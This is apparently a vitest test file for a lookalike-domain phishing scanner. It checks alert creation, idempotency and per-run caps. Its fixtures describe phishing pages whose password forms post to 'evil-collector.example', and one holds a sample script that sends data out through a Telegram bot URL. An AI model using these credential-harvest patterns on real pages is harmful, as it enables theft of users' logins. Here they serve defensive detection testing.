/**
 * Part 2 — the blind spot the first-contact suppression and the severity
 * floor create, and the path that closes it.
 *
 * `checkLookalikeBatch` can only alert on `registered 0 -> 1`. First
 * contact flips `registered` to 1 whether or not it alerted, and the
 * severity floor withholds sub-HIGH alerts on every path, so a row can
 * end up REGISTERED, with a persisted verdict, and NO alert — forever
 * out of reach of the checker's alert branch. `applyEscalation` cannot
 * rescue it either: it only bumps an EXISTING alert's severity, and its
 * UPDATE is guarded by `if (row.alert_id)`.
 *
 * So `analyzeLookalikePages` — the pass that produces the page verdict —
 * can now also raise the alert. These tests pin the three properties
 * that makes it safe to be a producer at all:
 *   * it fires only on `alert_id IS NULL` + a verdict that clears the
 *     PHISHING bar (not the "worth a look" bar),
 *   * it cannot double-create across runs or under CONCURRENCY = 4,
 *   * it is bounded per run, and says so when the bound bites.
 */

import { describe, it, expect, vi, beforeEach } from "vitest";
import type { ParsedPageSignals } from "../src/lib/page-phishing-scorer";
import type { Env } from "../src/types";

const { fetchSuspectPageSpy, createAlertSpy } = vi.hoisted(() => ({
  fetchSuspectPageSpy: vi.fn(),
  createAlertSpy: vi.fn(),
}));

vi.mock("../src/lib/page-fetch", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../src/lib/page-fetch")>();
  return { ...actual, fetchSuspectPage: fetchSuspectPageSpy };
});
vi.mock("../src/lib/alerts", () => ({ createAlert: createAlertSpy }));

const { analyzeLookalikePages, raiseUnalertedPhishingPageAlert } = await import(
  "../src/scanners/lookalike-page-analysis"
);
type PageAnalysisSelectRow =
  import("../src/scanners/lookalike-page-analysis").PageAnalysisSelectRow;

// ─── Page fixtures ────────────────────────────────────────────────

function baseSignals(over: Partial<ParsedPageSignals> = {}): ParsedPageSignals {
  return {
    hasPasswordInput: false,
    formActions: [],
    resourceUrls: [],
    iconHrefs: [],
    metaRefresh: null,
    scriptRedirectTargets: [],
    title: "Sign in",
    bodyTextSample: "Please sign in to continue",
    antiBotWall: null,
    scriptTextSample: "",
    scriptSinkTargets: [],
    commentSamples: [],
    metaGenerator: null,
    svgScriptPayload: false,
    svgDownloadDisguise: false,
    ...over,
  };
}

/** credential_form (30) + offdomain_form_exfil (45) → credentialHarvest. */
const CREDENTIAL_HARVEST = baseSignals({
  hasPasswordInput: true,
  formActions: ["https://evil-collector.example/steal"],
});

/** credential_form alone (30) → MEDIUM. Worth a look, not worth waking. */
const PASSWORD_ONLY = baseSignals({
  hasPasswordInput: true,
  formActions: ["/login"],
});

/** Nothing fires → score 0. */
const CLEAN = baseSignals();

// ─── D1 mock ──────────────────────────────────────────────────────

interface LRow {
  id: string;
  brand_id: string;
  domain: string;
  threat_level: string | null;
  alert_id: string | null;
  permutation_type: string;
  unicode_domain: string | null;
  has_mx: number | null;
  has_web: number | null;
  resolves_to: string | null;
  page_fetched_at: string | null;
  brand_name: string | null;
  brand_domain: string | null;
}

function makeLRow(id: string, over: Partial<LRow> = {}): LRow {
  return {
    id,
    brand_id: "b1",
    domain: `${id}.example`,
    threat_level: "MEDIUM",
    alert_id: null,
    permutation_type: "replacement",
    unicode_domain: null,
    has_mx: 0,
    has_web: 1,
    resolves_to: "5.6.7.8",
    page_fetched_at: null,
    brand_name: "Acme",
    brand_domain: "acme.example",
    ...over,
  };
}

const NOW = "MOCK_NOW";

function makeEnv(rows: LRow[]): { env: Env; store: Map<string, LRow>; linkAttempts: string[] } {
  const store = new Map(rows.map((r) => [r.id, r]));
  const linkAttempts: string[] = [];

  const DB = {
    prepare(sql: string) {
      const exec = (args: unknown[]) => ({
        async all() {
          // Re-read from the live store on every run, as D1 would — so a
          // second pass sees the `alert_id` the first pass wrote. That is
          // what makes the cross-run idempotency test meaningful rather
          // than an artefact of a frozen fixture.
          return { results: [...store.values()].map((r) => ({ ...r })) };
        },
        async run() {
          if (sql.includes("page_phishing_score = ?")) {
            const id = args[args.length - 1] as string;
            const row = store.get(id);
            if (row) row.page_fetched_at = NOW;
          } else if (sql.includes("lookalike_domains") && sql.includes("page_http_status = ?")) {
            const id = args[args.length - 1] as string;
            const row = store.get(id);
            if (row) row.page_fetched_at = NOW;
          } else if (sql.includes("SET threat_level = ?")) {
            const [level, id] = args as [string, string];
            const row = store.get(id);
            if (row) row.threat_level = level;
          } else if (sql.includes("SET alert_id = ?")) {
            const [alertId, id] = args as [string, string];
            linkAttempts.push(id);
            const row = store.get(id);
            // `WHERE id = ? AND alert_id IS NULL` — the conditional write
            // is the tripwire, so the mock has to honour the condition.
            if (row && row.alert_id === null) {
              row.alert_id = alertId;
              return { meta: { changes: 1 } };
            }
            return { meta: { changes: 0 } };
          } else if (sql.includes("UPDATE alerts")) {
            // Severity bump — no alert store here; nothing to assert.
          } else {
            throw new Error(`unexpected .run() for: ${sql}`);
          }
          return { meta: { changes: 1 } };
        },
      });
      return { ...exec([]), bind: (...args: unknown[]) => exec(args) };
    },
  };

  return { env: { DB } as unknown as Env, store, linkAttempts };
}

function servePage(signals: ParsedPageSignals) {
  return { ok: true, httpStatus: 200, contentHash: "cafef00d", signals };
}

let alertSeq = 0;
beforeEach(() => {
  vi.clearAllMocks();
  alertSeq = 0;
  createAlertSpy.mockImplementation(async () => `alert_${++alertSeq}`);
});

// ─── The gate ─────────────────────────────────────────────────────

describe("analyzeLookalikePages — raises an alert for an unalerted phishing page", () => {
  it("alerts a registered, alert-less row whose page is a credential-harvest kit", async () => {
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CREDENTIAL_HARVEST));
    const { env, store } = makeEnv([makeLRow("l1")]);

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(1);
    expect(summary.alert_cap_hit).toBe(false);
    expect(createAlertSpy).toHaveBeenCalledTimes(1);

    const params = createAlertSpy.mock.calls[0]![1] as Record<string, unknown>;
    expect(params.alertType).toBe("lookalike_domain_active");
    expect(params.severity).toBe("CRITICAL");
    // Same source contract as the checker's own call site.
    expect(params.sourceType).toBe("lookalike_scanner");
    expect(params.sourceId).toBe("l1");
    // Separable from the registration-transition producer without a
    // second alert_type.
    expect((params.details as Record<string, unknown>).discovered_by).toBe("page_analysis");

    // Linked back, which is also what makes the next run a no-op.
    expect(store.get("l1")!.alert_id).toBe("alert_1");
  });

  it("keys on alert_id, NOT on 'was an alert ever attempted'", async () => {
    // The floor interaction: this row is registered and MEDIUM with no
    // alert precisely BECAUSE the checker withheld one. It must still be
    // reachable here. A gate written against, say, `first_seen IS NULL`
    // or a "suppressed" marker would miss it.
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CREDENTIAL_HARVEST));
    const { env } = makeEnv([makeLRow("l1", { threat_level: "MEDIUM", alert_id: null })]);

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(1);
  });

  it("does NOT alert a row that already has an alert — it escalates instead", async () => {
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CREDENTIAL_HARVEST));
    const { env, store } = makeEnv([makeLRow("l1", { alert_id: "pre_existing" })]);

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(0);
    expect(createAlertSpy).not.toHaveBeenCalled();
    // The escalation path still ran — that is the pre-existing behaviour
    // this change must not disturb.
    expect(summary.escalated).toBe(1);
    expect(store.get("l1")!.threat_level).toBe("CRITICAL");
    expect(store.get("l1")!.alert_id).toBe("pre_existing");
  });

  it("does NOT alert on a merely-suspicious page (MEDIUM verdict)", async () => {
    // A password field with a same-origin action scores 30 → MEDIUM. The
    // row's own threat_level records "worth a look"; an alert needs more.
    fetchSuspectPageSpy.mockImplementation(async () => servePage(PASSWORD_ONLY));
    const { env, store } = makeEnv([makeLRow("l1", { threat_level: "LOW" })]);

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(0);
    expect(createAlertSpy).not.toHaveBeenCalled();
    // ...but the verdict is still persisted and the level still rose.
    expect(store.get("l1")!.threat_level).toBe("MEDIUM");
  });

  it("does NOT alert on a clean page", async () => {
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CLEAN));
    const { env } = makeEnv([makeLRow("l1", { threat_level: "LOW" })]);

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(0);
    expect(createAlertSpy).not.toHaveBeenCalled();
  });

  it("does not alert when the fetch failed — no verdict, nothing to say", async () => {
    fetchSuspectPageSpy.mockImplementation(async () => ({
      ok: false, httpStatus: 403, rejectedReason: "http_status",
    }));
    const { env } = makeEnv([makeLRow("l1")]);

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(0);
    expect(createAlertSpy).not.toHaveBeenCalled();
  });

  it("never puts attacker-controlled literals in alert details", async () => {
    // buildPageEvidenceDetails carries KEYS ONLY. The exfil sink host and
    // the matched evidence strings stay staff-only on lookalike_domains.
    fetchSuspectPageSpy.mockImplementation(async () => servePage(baseSignals({
      hasPasswordInput: true,
      formActions: ["https://evil-collector.example/steal"],
      scriptTextSample: "fetch('https://api.telegram.org/bot123456789:ABC-token/sendMessage')",
      scriptSinkTargets: ["api.telegram.org/bot123456789:ABC-token/sendMessage"],
    })));
    const { env } = makeEnv([makeLRow("l1")]);

    await analyzeLookalikePages(env);

    const details = JSON.stringify(
      (createAlertSpy.mock.calls[0]![1] as { details: unknown }).details,
    );
    expect(details).not.toContain("api.telegram.org");
    expect(details).not.toContain("123456789");
    expect(details).not.toContain("evil-collector");
    expect(details).not.toContain("page_evidence");
    expect(details).not.toContain("page_exfil_sink");
  });
});

// ─── Idempotency ──────────────────────────────────────────────────

describe("analyzeLookalikePages — cannot double-create", () => {
  it("a second run over the same row creates nothing", async () => {
    // The real cross-run guard is the 24h `page_fetched_at` cooldown in
    // the SELECT, which `runPageAnalysisForDomain` stamps BEFORE the
    // alert path is reached. This test deliberately removes that guard —
    // the mock SELECT ignores the cooldown and re-serves the row — so
    // what is under test is the `alert_id IS NULL` gate ALONE. If the
    // cooldown ever stops covering us, the gate still does.
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CREDENTIAL_HARVEST));
    const { env, store } = makeEnv([makeLRow("l1")]);

    const first = await analyzeLookalikePages(env);
    const second = await analyzeLookalikePages(env);

    expect(first.alerts_raised).toBe(1);
    expect(second.alerts_raised).toBe(0);
    expect(createAlertSpy).toHaveBeenCalledTimes(1);
    expect(store.get("l1")!.alert_id).toBe("alert_1");
  });

  it("concurrent rows in one run each get exactly one alert, and no row gets two", async () => {
    // CONCURRENCY = 4 with 4 qualifying rows: every row id appears once
    // in the SELECT (it is the primary key), so no two in-flight tasks
    // share a row and the per-row count cannot exceed one.
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CREDENTIAL_HARVEST));
    const ids = ["l1", "l2", "l3", "l4"];
    const { env, store, linkAttempts } = makeEnv(ids.map((id) => makeLRow(id)));

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(4);
    expect(createAlertSpy).toHaveBeenCalledTimes(4);
    // One link attempt per row, and every one succeeded — so the
    // conditional `AND alert_id IS NULL` never had to reject anything.
    expect(linkAttempts.sort()).toEqual(ids);
    for (const id of ids) expect(store.get(id)!.alert_id).not.toBeNull();
    expect(new Set(ids.map((id) => store.get(id)!.alert_id)).size).toBe(4);
  });

  it("the conditional link refuses to overwrite an alert_id that appeared mid-flight", async () => {
    // Direct test of the tripwire. Per the ordering argument this state
    // is unreachable in production; the assertion is that if it ever
    // happens, the existing link WINS and the collision is visible
    // rather than silently replaced.
    const { env, store } = makeEnv([makeLRow("l1")]);
    const row = store.get("l1")!;
    row.alert_id = "raced_in";

    const phishing = {
      score: 75,
      signals: ["credential_form", "offdomain_form_exfil"],
      credentialHarvest: true,
      antiBotWallFamily: null,
      aiSignals: [],
      scoreDelta: 0,
      evidence: {},
      pageGenerator: null,
      exfilSink: null,
      exfilSinkId: null,
    };
    const outcome = await raiseUnalertedPhishingPageAlert(
      env,
      { ...row, alert_id: null } as PageAnalysisSelectRow,
      phishing,
    );

    expect(outcome.created).toBe(true);
    // The pre-existing link is preserved — the UPDATE matched zero rows.
    expect(store.get("l1")!.alert_id).toBe("raced_in");
  });

  it("does not link anything when createAlert declines (NX2 tier gate)", async () => {
    createAlertSpy.mockResolvedValue(null);
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CREDENTIAL_HARVEST));
    const { env, store, linkAttempts } = makeEnv([makeLRow("l1")]);

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(0);
    expect(linkAttempts).toEqual([]);
    expect(store.get("l1")!.alert_id).toBeNull();
  });
});

// ─── The per-run bound ────────────────────────────────────────────

describe("analyzeLookalikePages — bounded so it cannot become a second flood", () => {
  it("caps creations per run and reports that the cap bit", async () => {
    // PAGE_ALERT_CAP is 5. Eight qualifying rows → 5 alerts, and the
    // remaining three are DEFERRED: their verdicts are persisted and
    // their alert_id stays NULL, so the next pass picks them up.
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CREDENTIAL_HARVEST));
    const ids = ["l1", "l2", "l3", "l4", "l5", "l6", "l7", "l8"];
    const { env, store } = makeEnv(ids.map((id) => makeLRow(id)));

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(5);
    expect(summary.alert_cap_hit).toBe(true);
    expect(createAlertSpy).toHaveBeenCalledTimes(5);

    const unalerted = ids.filter((id) => store.get(id)!.alert_id === null);
    expect(unalerted).toHaveLength(3);
    // Deferred, not dropped — every row still carries its escalated
    // verdict, which is the deliverable.
    for (const id of unalerted) expect(store.get(id)!.threat_level).toBe("CRITICAL");
  });

  it("a run under the cap does not report a cap hit", async () => {
    fetchSuspectPageSpy.mockImplementation(async () => servePage(CREDENTIAL_HARVEST));
    const { env } = makeEnv([makeLRow("l1"), makeLRow("l2")]);

    const summary = await analyzeLookalikePages(env);

    expect(summary.alerts_raised).toBe(2);
    expect(summary.alert_cap_hit).toBe(false);
  });
});
